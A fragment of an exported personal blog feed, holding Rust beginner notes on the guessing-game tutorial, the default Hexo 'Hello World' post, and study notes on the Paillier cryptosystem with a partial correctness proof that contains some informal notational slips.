length)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>debug</strong></p>
<p>terminal</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">cargo run</span><br></pre></td></tr></table></figure>



<img src="/2023/06/07/Rust-Study/image-20230801194048161.png" class="" title="image-20230801194048161">

<p>cmd</p>
<img src="/2023/06/07/Rust-Study/image-20230801194128439.png" class="" title="image-20230801194128439">



<p><strong>release</strong></p>
<p>terminal</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">cargo run --release</span><br></pre></td></tr></table></figure>



<img src="/2023/06/07/Rust-Study/image-20230801194156966.png" class="" title="image-20230801194156966">

<p>cmd</p>
<img src="/2023/06/07/Rust-Study/image-20230801194243595.png" class="" title="image-20230801194243595">

<h2 id="understand-code"><a href="#understand-code" class="headerlink" title="understand code"></a>understand code</h2><ul>
<li>Control flow: <code>for</code> go with <code>continue</code></li>
<li>Method syntax: Since Rust has no inheritance, Rust is not an object-oriented language in the traditional sense, but it steals methods from the OO language using <code>record.trim()</code>, <code>record.split(&#39;,&#39;)</code>, etc.</li>
<li>Lambda function: Functions can be taken as parameters or as return values.</li>
</ul>
<h1 id="Guess-game"><a href="#Guess-game" class="headerlink" title="Guess game"></a>Guess game</h1><blockquote>
<p>RustProject&#x2F;guessing_game</p>
</blockquote>
<h2 id="accept-the-user’s-input"><a href="#accept-the-user’s-input" class="headerlink" title="accept the user’s input"></a>accept the user’s input</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io; </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Guessing the number!&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Please input your guess:&quot;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>(); </span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">        .<span class="title function_ invoke__">except</span>(<span class="string">&quot;Failed to read line&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;You guessed: &#123;&#125;&quot;</span>, guess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="go-over-it-line-by-line"><a href="#go-over-it-line-by-line" class="headerlink" title="go over it line by line"></a>go over it line by line</h3><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io; </span><br></pre></td></tr></table></figure>

<p>bring the io library which comes from the standard library (std)</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;&#125;</span><br></pre></td></tr></table></figure>

<p><code>fn</code> means a new function</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Guessing the number!&quot;</span>);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Please input your guess:&quot;</span>); </span><br></pre></td></tr></table></figure>

<ul>
<li><p>state what the game is</p>
</li>
<li><p>request input from the user</p>
</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br></pre></td></tr></table></figure>

<p><code>let</code> statement to create a variable to store the user’s input, to remember that once given it will not change, for example:</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">apples</span> = <span class="number">5</span>;</span><br><span class="line"><span class="comment">// a new variable named apples and binds to the value 5</span></span><br></pre></td></tr></table></figure>

<p>Thus, we add <code>mut</code> before the variable name.</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">//example</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">apples</span> = <span class="number">5</span>; <span class="comment">//immutable</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">bananas</span> = <span class="number">5</span>; <span class="comment">//mutable</span></span><br></pre></td></tr></table></figure>

<p>the <code>::</code>  in <code>::new</code> line indicates that <code>new</code> is an associated function of the <code>String </code> type.</p>
<p><em><code>let mut guess = String::new();</code>means that it created a mutable variable that is currently bound to a new, empty instance of a <code>String</code>.</em></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br></pre></td></tr></table></figure>

<p>call <code>stdin</code> function from <code>io</code> module, which allows us to handle user input</p>
<p><code>.read_line(&amp;mut guess)</code> call the <code>read_line</code> method on the standard input to get input from the user.</p>
<p>pass <code>&amp;mut guess</code> to <code>read_line</code> to tell string to store the user’s input</p>
<p><code>&amp;</code> indicates that this argument is a reference, no need to copy that data into memory multiple times</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">.<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read line&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>return a <code>Result</code> type to encode error-handling information</p>
<p><code>Result</code>‘s variants are <code>Ok</code> and <code>Err</code>.</p>
<p>If we don’t call <code>expect</code>, the program will compile, but it will get a warning.</p>
<p>The right way to suppress the warning is to actually write error-handling code, but in our case we just want to crash this program when a problem occurs, so we can use <code>expect</code>.</p>
<p>PAY ATTENTION ! <code>Expect</code> NOT <code>Except</code> !!!</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;You guessed: &#123;&#125;&quot;</span>, guess);</span><br></pre></td></tr></table></figure>

<p>The line prints the string that now contains the user’s input.</p>
<h2 id="generate-a-random-number"><a href="#generate-a-random-number" class="headerlink" title="generate a random number"></a>generate a random number</h2><p>Aim to generate a secret number that we will try to guess.</p>
<p>The random number between 1 and 100.</p>
<p>The <code>rand</code> crate is a library crate, which contains code that is intended to be used in other programs and can’t be executed on its own.</p>
<p><em>crate is a term in Rust, meaning a stand-alone library or project</em></p>
<p><em><code>library crate</code> which means the project contains library code</em></p>
<p>So we should import it in <code>Cargo.toml</code> which include the <code>rand</code> crate as a dependency.</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">[dependencies]</span><br><span class="line">rand = <span class="string">&quot;0.8.5&quot;</span></span><br><span class="line"><span class="comment">// rand = &quot;^0.8.5&quot; at least 0.8.5 but below 0.9.0</span></span><br></pre></td></tr></table></figure>

<p>contains below:</p>
<ul>
<li>crate name</li>
<li>crate version</li>
</ul>
<p>run <code>cargo build</code> after adding the rand crate as a dependency</p>
<p>After updating the registry, Cargo checks the <code>[dependencies]</code> section and downloads any crates listed that aren’t already downloaded. In this case, although we only listed <code>rand</code> as a dependency, Cargo also grabbed other crates that <code>rand</code> depends on to work. After downloading the crates, Rust compiles them and then compiles the project with the dependencies available.</p>
<p>add code to generate a random number:</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> rand::Rng;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">secret_number</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>..=<span class="number">100</span>);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;The secret number is: &#123;secret_number&#125;&quot;</span>); </span><br></pre></td></tr></table></figure>

<h3 id="go-over-it-line-by-line-1"><a href="#go-over-it-line-by-line-1" class="headerlink" title="go over it line by line"></a>go over it line by line</h3><p>First, add the line <code>use rand::Rng;</code>. <code>Rng</code>  trait defines methods that random generators implement, and the trait must be in scope for us to use those methods.</p>
<p>Second, we call <code>rand::thread_rng</code> function that gives us the random generator, and it is local to the current thread of execution and is seeded by the operating system.</p>
<p>Third, <code>gen_range</code>is a function that define the random number range, which we brought into scope with the <code>rand::Rng;</code> statement.</p>
<p><em>The usage is that <code>start..=end</code>, is inclusive on the lower and upper bounds. For example <code>1..=100</code> means request a number between 1 and 100.</em></p>
<blockquote>
<p>You won’t just know which traits to use and which methods and functions to call from a crate, so each crate has documentation with instructions for using it.</p>
</blockquote>
<h2 id="ensure-reproducible-build-with-the-cargo-lock-file"><a href="#ensure-reproducible-build-with-the-cargo-lock-file" class="headerlink" title="ensure reproducible build with the cargo.lock file"></a>ensure reproducible build with the <code>cargo.lock</code> file</h2><p>Rust creates the <code>Cargo.lock</code> file the first time when running <code>cargo build</code>.</p>
<p>The <code>Cargo.lock</code> file is important for reproducible builds, and it’s often checked into source control with the rest of the code in your project.</p>
<h2 id="update-a-crat-to-get-a-new-version"><a href="#update-a-crat-to-get-a-new-version" class="headerlink" title="update a crat to get a new version"></a>update a crat to get a new version</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">cargo update</span><br></pre></td></tr></table></figure>

<p>and the dependencies will change.</p>
<p>The next time you run <code>cargo build</code>, Cargo will update the registry of crates available and reevaluate your <code>rand</code> requirements according to the new version you have specified.</p>
<p>Cargo makes it very easy to reuse libraries, so Rustaceans are able to write smaller projects that are assembled from a number of packages.</p>
<p><em>Rustaceans means users or developers who use the <code>Rust</code></em></p>
<p>at this time, the complete code is:</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io; <span class="comment">//bring the io library which comes from the standard library (std)</span></span><br><span class="line"><span class="keyword">use</span> rand::Rng;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123; <span class="comment">//fn means a new function</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Guessing the number!&quot;</span>); <span class="comment">//state what the game is</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">secret_number</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>..=<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The secret number is: &#123;secret_number&#125;&quot;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Please input your guess:&quot;</span>); <span class="comment">//request input from the user</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>(); <span class="comment">//&#x27;let&#x27; statement to create a variable to store the user&#x27;s input, to rmember that once given it will not change</span></span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Failed to read line&quot;</span>); <span class="comment">// not except</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;You guessed: &#123;&#125;&quot;</span>, guess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>when we run <code>cargo run</code>, we will see:</p>
<img src="/2023/06/07/Rust-Study/image-20231107103926686.png" class="" title="image-20231107103926686">

<p>However it won’t achieve the aim to generate a secret number and compare it to the guessing number.</p>
<h2 id="compare-the-guess-to-the-secret-number"><a href="#compare-the-guess-to-the-secret-number" class="headerlink" title="compare the guess to the secret number"></a>compare the guess to the secret number</h2><h3 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h3><p><strong>make a comparison</strong></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::cmp::Ordering</span><br><span class="line"></span><br><span class="line"><span class="comment">// based on the original foundation</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">guess</span>: <span class="type">u32</span> = guess.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Please type a number!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> guess.<span class="title function_ invoke__">cmp</span>(&amp;secret_number) &#123;</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too small!&quot;</span>),</span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too big!&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; <span class="built_in">println!</span>(<span class="string">&quot;YOU WIN!&quot;</span>),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>However it return a number comparison and break.</p>
<h3 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h3><p><strong>turn into a loop</strong></p>
<p>Notice the numbers’ usage and the order of using these different numbers.</p>
<p>We ought to generate different <code>guess</code> to solve out the <code>secret_number</code> which is generated by the system.</p>
<p>So <code>secret_number</code> is above loop.</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">secret_number</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>..=<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">loop</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">guess</span>: <span class="type">u32</span> = guess.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Please type a number!&quot;</span>);</span><br><span class="line">    <span class="keyword">match</span> guess.<span class="title function_ invoke__">cmp</span>(&amp;secret_number) &#123;</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too small!&quot;</span>),</span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too big!&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; <span class="built_in">println!</span>(<span class="string">&quot;YOU WIN!&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h3><p><strong>equal then break</strong></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">match</span> guess.<span class="title function_ invoke__">cmp</span>(&amp;secret_number) &#123;</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too small!&quot;</span>),</span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too big!&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;YOU WIN!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;      </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="complete-code"><a href="#complete-code" class="headerlink" title="complete code"></a>complete code</h3><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"><span class="keyword">use</span> rand::Rng;</span><br><span class="line"><span class="keyword">use</span> std::cmp::Ordering;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="comment">// generte a random number</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">secret_number</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>..=<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// guess number, need to define the type is real a number</span></span><br><span class="line">    <span class="comment">// the precess of guessing is changeable which we should let it in a loop</span></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Please input your guess!&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">            .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">            .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Fail to read line!&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">guess</span>: <span class="type">u32</span> = guess.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Please type a number!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;You guessed: &#123;guess&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// compare the two numbers</span></span><br><span class="line">        <span class="keyword">match</span> guess.<span class="title function_ invoke__">cmp</span>(&amp;secret_number) &#123;</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too small!&quot;</span>),</span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too big!&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;YOU WIN!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>run <code>cargo run</code>:</p>
<img src="/2023/06/07/Rust-Study/image-20231107150820040.png" class="" title="image-20231107150820040">



<h2 id="handle-invalid-input"><a href="#handle-invalid-input" class="headerlink" title="handle invalid input"></a>handle invalid input</h2><p>To further refine the game’s behavior, rather than crashing the program when the user inputs a non-number, let’s make the game ignore a non-number so the user can continue guessing. We can do that by altering the line where <code>guess</code> is converted from a <code>String</code> to a <code>u32</code>, as shown in Listing 2-5.</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">//let guess: u32 = guess.trim().parse().expect(&quot;Please type a number!&quot;);</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">guess</span>: <span class="type">u32</span> = <span class="keyword">match</span> guess.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>() &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(num) =&gt; num,</span><br><span class="line">            <span class="title function_ invoke__">Err</span>(_) =&gt; <span class="keyword">continue</span>,</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<h3 id="go-over-it-line-by-line-2"><a href="#go-over-it-line-by-line-2" class="headerlink" title="go over it line by line"></a>go over it line by line</h3><p>Switch an <code>expect</code> call to a <code>match</code> expression to move from crashing on an error to handle the error.</p>
<p>The <code>parse</code> returns a <code>Result</code> type and <code>Result</code> is an <code>enum</code> that has the variants <code>Ok</code> and <code>Err</code>.</p>
<p>We use a <code>match</code> expression here, same as the <code>Ordering</code> result if the <code>cmp</code> method.</p>
<ul>
<li>If <code>parse</code> is able to turn the string into a number, return <code>Ok</code> contains <code>resultant number</code>. The number will end up right where we want it in the new <code>guess</code> variable we’re creating.</li>
<li>If not, it will return an <code>Err</code> value, we just <code>continue</code> and return to <code>loop</code> to ask for another guess.</li>
</ul>
<p>Finally ,the program ignores all errors that <code>parse</code> might encounter.</p>
<h1 id="Common-programming-concepts"><a href="#Common-programming-concepts" class="headerlink" title="Common programming concepts"></a>Common programming concepts</h1><h2 id="variables-and-mutability"><a href="#variables-and-mutability" class="headerlink" title="variables and mutability"></a>variables and mutability</h2><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fn main() &#123;</span></span><br><span class="line"><span class="comment">//     let x = 5;</span></span><br><span class="line"><span class="comment">//     println!(&quot;The value of x is: &#123;x&#125;&quot;);</span></span><br><span class="line"><span class="comment">//     x = 6;</span></span><br><span class="line"><span class="comment">//     println!(&quot;The value of x is: &#123;x&#125;&quot;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;x&#125;&quot;</span>);</span><br><span class="line">    x = <span class="number">6</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;x&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Language</category>
      </categories>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/10/21/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>

<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Paillier-Cryptosystem</title>
    <url>/2023/03/15/paillier-cryptosystem/</url>
    <content><![CDATA[<p>Two different approaches to homomorphic encryption. These ways are called as “paillier-cryptosystem”. </p>
<p>And to understand the principle behind them, I do the proof. </p>
<span id="more"></span><!--toc-->

<h1 id="INIT"><a href="#INIT" class="headerlink" title="INIT"></a>INIT</h1><h2 id="FIRST-PATTERN"><a href="#FIRST-PATTERN" class="headerlink" title="FIRST PATTERN"></a>FIRST PATTERN</h2><ul>
<li><p>produce two large primes $p$, $q$, assert them that $gcd(p\times q, (p-1)\times(q-1) &#x3D; 1$</p>
</li>
<li><p>calculate $n &#x3D; p\times q$, define that $\lambda &#x3D; lcm(p-1, q-1) &#x3D; \frac{(p-1)\times(q-1)}{gcd(p-1, q-1)}$</p>
</li>
<li><p>produce random $g$, and $0&lt;g&lt;n^{2}$</p>
</li>
<li><p>define that $L(x) &#x3D; \frac{x-1}{n}$</p>
</li>
<li><p>define that $\mu &#x3D; (L(g^{\lambda} \mod n^{2}))^{-1} \mod n$</p>
</li>
</ul>
<h2 id="SECOND-PATTERN"><a href="#SECOND-PATTERN" class="headerlink" title="SECOND PATTERN"></a>SECOND PATTERN</h2><ul>
<li><p>define that $g &#x3D; n  + 1$</p>
</li>
<li><p>define that $\lambda &#x3D; \varphi(n) &#x3D; (p-1)\times (q-1) $</p>
</li>
<li><p>and also define that $\mu &#x3D; \varphi(n)^{-1} \mod n$</p>
</li>
</ul>
<h1 id="KEYS"><a href="#KEYS" class="headerlink" title="KEYS"></a>KEYS</h1><ul>
<li>PK &#x3D; {$n$, $g$}</li>
<li>SK &#x3D; {$\lambda$, $\mu$}</li>
</ul>
<h1 id="ENCRYPT-AND-DECRYPT"><a href="#ENCRYPT-AND-DECRYPT" class="headerlink" title="ENCRYPT AND DECRYPT"></a>ENCRYPT AND DECRYPT</h1><h2 id="ENCRYPT"><a href="#ENCRYPT" class="headerlink" title="ENCRYPT"></a>ENCRYPT</h2><ul>
<li>assert that $0&lt;m&lt;n$</li>
<li>produce a random $r$, assert that $gcd(r, n) &#x3D; 1$</li>
<li>$c \equiv g^{m} \cdot r^{n} \mod n^{2}$</li>
</ul>
<h2 id="DECRYPT"><a href="#DECRYPT" class="headerlink" title="DECRYPT"></a>DECRYPT</h2><ul>
<li>$m \equiv (L(c^{\lambda} \mod n^{2})\cdot \mu)\mod n$</li>
</ul>
<h1 id="PROOF"><a href="#PROOF" class="headerlink" title="PROOF"></a>PROOF</h1><h2 id="PATTERN-1"><a href="#PATTERN-1" class="headerlink" title="PATTERN 1"></a>PATTERN 1</h2><ul>
<li>substitute the equation of $c$ into $m$, we get the $eq1$</li>
</ul>
<p>$$<br>m \equiv (L(g^{m\lambda}\cdot r^{n\lambda} \mod n^{2})\cdot \mu)\mod n<br>$$ {eq1}</p>
<ul>
<li>substitute $\mu$ to ${eq1}$, we get the $eq2$</li>
</ul>
<p>$$<br>m \equiv L(g^{m\lambda}\cdot r^{n\lambda} \mod n^{2}) \cdot (L(g^{\lambda} \mod n^{2}))^{-1} \mod n<br>$$ {eq2}</p>
<ul>
<li>make some deductions to get the $g^{\lambda}$</li>
</ul>
<p>$$<br>p-1 | \lambda and  q-1 | \lambda<br>$$</p>
<p>so  we can get the equations that:<br>$$<br>\lambda &#x3D; k_1(p-1) and \lambda &#x3D; k_2(q-1)<br>$$<br>fermat little theorem:<br>$$<br>g^{\lambda} &#x3D; g^{k_1(p-1)} \equiv 1 \mod p<br>$$</p>
<p>$$<br>g^{\lambda} &#x3D; g^{k_2(q-1)} \equiv 1 \mod q<br>$$</p>
<p>$$<br>\Longrightarrow g^{\lambda} - 1 | q and g^{\lambda} - 1 | p<br>$$</p>
<p>$$<br>\Longrightarrow g^{\lambda} - 1 | lcm(p, q)<br>$$</p>
<p>$$<br>\Longrightarrow g^{\lambda} - 1 | n<br>$$</p>
<p>at last, we get the key equation:<br>$$<br>g^{\lambda} \equiv 1 \mod n<br>$$</p>
<p>$$<br>\Longrightarrow g^{\lambda} \mod n^{2} \equiv  1 \mod n<br>$$</p>
<p>$$<br>\Longrightarrow g^{\lambda} &#x3D; 1 + k_g \cdot n<br>$$</p>
<p>the $k_g$ is less than $n$</p>
<p>substitute $g^{\lambda}$ into $L(x)$:<br>$$<br>L(g^{\lambda} \mod n^{2}) &#x3D; k_g<br>$$</p>
<ul>
<li>also make some deductions to get $g^{m\lambda}$</li>
</ul>
<p>$$<br>1 + kn \equiv 1 + kn \mod n^{2}<br>$$</p>
<p>$$<br>(1 + kn)^{2} \equiv 1 + 2kn + (kn)^{2} \mod n^{2} \equiv 1 + 2kn \mod n^{2}<br>$$</p>
<p>$$<br>(1 + kn)^{3} \equiv 1 + 3kn + 3(kn)^{2} + (kn)^{3} \equiv 1+3kn \mod n^{2}<br>$$</p>
<p>$$<br>\Longrightarrow (1 + kn)^{m}\equiv 1+mkn \mod n^{2}<br>$$</p>
<p>$$<br>\Longrightarrow g^{m\lambda}&#x3D;(1+k_gn)^{m}\equiv 1 + mk_gn \mod n^{2}<br>$$</p>
<ul>
<li>same to get $r^{n\lambda}$</li>
</ul>
<p>$$<br>r^{n\lambda} &#x3D;(1+k_rn)^{n}\equiv 1 + k_r n^{2} \mod n^{2} \equiv 1\mod n^{2}<br>$$</p>
<ul>
<li>substitute $g^{m\lambda}$ , $r^{n\lambda}$ and $L(g^{\lambda} \mod n^{2})$ into $eq2$</li>
</ul>
<p>$$<br>m \equiv L(1 + mk_gn \mod n^{2}) \cdot (L(g^{\lambda} \mod n^{2}))^{-1} \mod n<br>$$</p>
<p>$$<br>m \equiv k_g m \cdot k_g^{-1} \mod n \equiv m \mod n<br>$$</p>
<p><strong>Proved.</strong> </p>
<h2 id="PATTERN-2"><a href="#PATTERN-2" class="headerlink" title="PATTERN 2"></a>PATTERN 2</h2><ul>
<li>also substitute $c$ into $m$</li>
</ul>
<p>$$<br>L(g^{m\lambda}\cdot r^{n\lambda} \mod n^{2})\cdot \mu \mod n<br>$$</p>
<ul>
<li>substitute $\lambda$ into $r^{n\lambda}$ and make some deductions</li>
</ul>
<p>$$<br>r^{n\lambda} &#x3D; r^{n(p-1)(q-1)} &#x3D; r^{p(p-1) \cdot q(q-1)}<br>$$</p>
<p>using Euler’s totient function 3 that $\varphi(p^k) &#x3D; p^k - p^{k-1} &#x3D; (p-1)\cdot p^{k-1} &#x3D; \varphi(p) \cdot p^{k-1}$ and fermat little theorem<br>$$<br>r^{p(p-1) \cdot q(q-1)} &#x3D; r^{\varphi(n^2)} \equiv 1 \mod n^{2}<br>$$</p>
<p>$$<br>r^{n\lambda} \equiv 1 \mod n^{2}<br>$$</p>
<ul>
<li>get the simple equation, we get the $eq3$</li>
</ul>
